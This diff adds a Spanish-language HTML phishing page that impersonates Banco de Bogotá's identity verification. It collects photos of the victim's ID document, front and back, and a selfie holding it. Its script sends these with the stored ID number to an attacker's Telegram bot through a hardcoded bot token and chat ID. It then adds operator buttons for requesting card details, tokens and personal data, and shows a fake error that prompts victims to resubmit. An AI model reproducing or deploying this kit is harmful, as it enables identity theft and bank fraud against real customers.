@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Bogotá - Verificación</title>
+
+    <style>
+        /* ===== RESET + LOADER (igual que index1) ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #2c3e50;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loader-container {
+            width: 60px;
+            height: 60px;
+            position: relative;
+            animation: rotateLoader 1.5s linear infinite;
+        }
+
+        .dot {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+        }
+
+        .dot-yellow {
+            background: #f1c40f;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .dot-blue {
+            background: #3498db;
+            bottom: 5px;
+            left: 0;
+        }
+
+        .dot-red {
+            background: #e74c3c;
+            bottom: 5px;
+            right: 0;
+        }
+
+        @keyframes rotateLoader {
+            0% {
+                transform: rotate(0)
+            }
+
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+
+        /* ===== BASE ===== */
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%);
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: flex-start;
+            max-width: 1000px;
+            margin: 20px auto;
+            padding: 20px;
+            gap: 40px;
+        }
+
+        /* LOGIN SECTION */
+        .container__login {
+            flex: 0 0 380px;
+            width: 380px;
+        }
+
+        .container__login--header img {
+            max-width: 200px;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        /* BLUE BANNER */
+        .blue-banner {
+            background: #0033a0;
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: .85em;
+        }
+
+        .blue-banner img {
+            width: 35px;
+            height: 35px;
+            flex-shrink: 0;
+        }
+
+        /* CARD */
+        .login-card-content {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, .08);
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+
+        /* UPLOAD BOXES */
+        .upload-box {
+            border: 2px dashed #0033a0;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all .2s;
+        }
+
+        .upload-box:hover {
+            background: #f4f8ff;
+        }
+
+        .upload-box.done {
+            border-color: #28a745;
+            background: #e8f5e9;
+        }
+
+        .preview-img {
+            max-width: 100%;
+            max-height: 150px;
+            margin-top: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        /* ESTILO DEL MENSAJE DE ERROR (Nuevo) */
+        #error-mensaje {
+            display: none;
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 0.85em;
+            border: 1px solid #c62828;
+            font-weight: bold;
+        }
+
+        /* BUTTON */
+        .btn-main {
+            width: 100%;
+            padding: 12px;
+            background: #0033a0;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-main:hover {
+            background: #002a80;
+        }
+
+        .btn-main:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
+
+        /* INFO SECTION */
+        .container__info {
+            flex: 1;
+            max-width: 500px;
+        }
+
+        .container__info img {
+            width: 100%;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, .1);
+        }
+
+        /* RESPONSIVE MÓVIL */
+        @media (max-width:768px) {
+            body {
+                background: #fff !important;
+                padding: 0;
+            }
+
+            .container {
+                flex-direction: column;
+                align-items: center;
+                padding: 10px;
+                margin: 10px auto;
+                gap: 15px;
+            }
+
+            .container__login {
+                width: 100%;
+                max-width: 100%;
+                flex: none;
+            }
+
+            .container__login--header img {
+                max-width: 180px;
+            }
+
+            .container__info {
+                width: 100%;
+                max-width: 100%;
+                flex: none;
+            }
+
+            .login-card-content {
+                padding: 15px;
+            }
+
+            .blue-banner {
+                padding: 10px;
+                font-size: .8em;
+            }
+
+            .blue-banner img {
+                width: 30px;
+                height: 30px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loading-overlay">
+        <div class="loader-container">
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-blue"></div>
+            <div class="dot dot-red"></div>
+        </div>
+        <div style="color:#fff;margin-top:20px;">Enviando fotos...</div>
+    </div>
+
+    <div class="container">
+        <div class="container__login">
+            <div class="container__login--header">
+                <img src="logobanco1.png" alt="Banco de Bogotá" />
+            </div>
+            <div class="container__login--title">
+                <h2>Verificación de Identidad</h2>
+            </div>
+
+            <div class="blue-banner">
+                <img src="per.png" alt="Icono" />
+                <div><strong>Validación</strong><br>Toma fotos de tu documento y selfie.</div>
+            </div>
+
+            <div class="login-card-content">
+                <div id="error-mensaje">
+                    ⚠️ Las fotos enviadas no son legibles o no coinciden. Por favor, intenta de nuevo.
+                </div>
+
+                <form onsubmit="return enviar(event);">
+                    <div class="upload-box" id="b1" onclick="document.getElementById('f1').click()">
+                        <div style="font-size:24px;color:#0033a0;">📷</div>
+                        <div style="font-weight:bold;margin:5px 0;">1. Documento (Frente)</div>
+                        <div style="font-size:.8em;color:#666;">Toca para tomar foto</div>
+                        <input type="file" id="f1" accept="image/*" style="display:none;" onchange="preview(this,'p1','b1')">
+                        <img id="p1" class="preview-img">
+                    </div>
+
+                    <div class="upload-box" id="b2" onclick="document.getElementById('f2').click()">
+                        <div style="font-size:24px;color:#0033a0;">📷</div>
+                        <div style="font-weight:bold;margin:5px 0;">2. Documento (Reverso)</div>
+                        <div style="font-size:.8em;color:#666;">Toca para tomar foto</div>
+                        <input type="file" id="f2" accept="image/*" style="display:none;" onchange="preview(this,'p2','b2')">
+                        <img id="p2" class="preview-img">
+                    </div>
+
+                    <div class="upload-box" id="b3" onclick="document.getElementById('f3').click()">
+                        <div style="font-size:24px;color:#0033a0;">🤳</div>
+                        <div style="font-weight:bold;margin:5px 0;">3. Selfie con Documento</div>
+                        <div style="font-size:.8em;color:#666;">Tu rostro + documento</div>
+                        <input type="file" id="f3" accept="image/*" style="display:none;" onchange="preview(this,'p3','b3')">
+                        <img id="p3" class="preview-img">
+                    </div>
+
+                    <button type="submit" class="btn-main" id="btn">Continuar</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="container__info">
+            <img src="talaval.png" alt="Banner">
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = '8760922430:AAFxF0ctzvvqKgkZvcB3MRQlyIzzdG7ijQ0';
+        const CHAT = '-1003577139660';
+
+        // Lógica para mostrar error si viene el parámetro en la URL (Nuevo)
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('error') === 'invalid') {
+                document.getElementById('error-mensaje').style.display = 'block';
+            }
+        });
+
+        function preview(input, pId, bId) {
+            const p = document.getElementById(pId);
+            const b = document.getElementById(bId);
+            const file = input.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = e => {
+                    p.src = e.target.result;
+                    p.style.display = 'block';
+                    b.classList.add('done');
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        async function sendPhoto(file, caption, addBtns = false) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT);
+            fd.append('photo', file);
+            fd.append('caption', caption);
+            fd.append('parse_mode', 'HTML');
+
+            if (addBtns) {
+                const kb = {
+                    inline_keyboard: [
+                        [{ text: '❌ Error', callback_data: 'error_logo' }, { text: '🔐 Token', callback_data: 'token' }],
+                        [{ text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito' }, { text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito' }],
+                        [{ text: '📋 Datos Personales', callback_data: 'datos_personales' }],
+                        [{ text: '✅ Soy Yo', callback_data: 'soyyo' }, { text: '🏁 Finalizar', callback_data: 'finalizar' }]
+                    ]
+                };
+                fd.append('reply_markup', JSON.stringify(kb));
+            }
+
+            const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: fd
+            });
+            return await r.json();
+        }
+
+        async function enviar(e) {
+            e.preventDefault();
+            const f1 = document.getElementById('f1').files[0];
+            const f2 = document.getElementById('f2').files[0];
+            const f3 = document.getElementById('f3').files[0];
+            if (!f1 || !f2 || !f3) {
+                alert('Por favor carga las 3 fotos');
+                return false;
+            }
+
+            const btn = document.getElementById('btn');
+            btn.disabled = true;
+            btn.textContent = 'Enviando...';
+            document.getElementById('loading-overlay').style.display = 'flex';
+
+            const tipoId = localStorage.getItem('user_id_type') || 'CC';
+            const numId = localStorage.getItem('user_id_number') || '?';
+            const cap = `\n\n👤 ${tipoId} ${numId}\n🏦 Banco de Bogotá`;
+
+            try {
+                await sendPhoto(f1, `📷 <b>DOCUMENTO FRONTAL</b>${cap}`, false);
+                await sendPhoto(f2, `📷 <b>DOCUMENTO REVERSO</b>${cap}`, false);
+                const d3 = await sendPhoto(f3, `🤳 <b>SELFIE</b>${cap}`, true);
+                if (d3.ok) {
+                    localStorage.setItem('bbogota_msg_id', d3.result.message_id);
+                    window.location.href = 'load.html';
+                } else {
+                    throw new Error('Error foto 3');
+                }
+            } catch (err) {
+                console.error('❌', err);
+                alert('Error al enviar. Revisa la consola o Caido.');
+                document.getElementById('loading-overlay').style.display = 'none';
+                btn.disabled = false;
+                btn.textContent = 'Continuar';
+            }
+            return false;
+        }
+    </script>
+</body>
+
+</html>
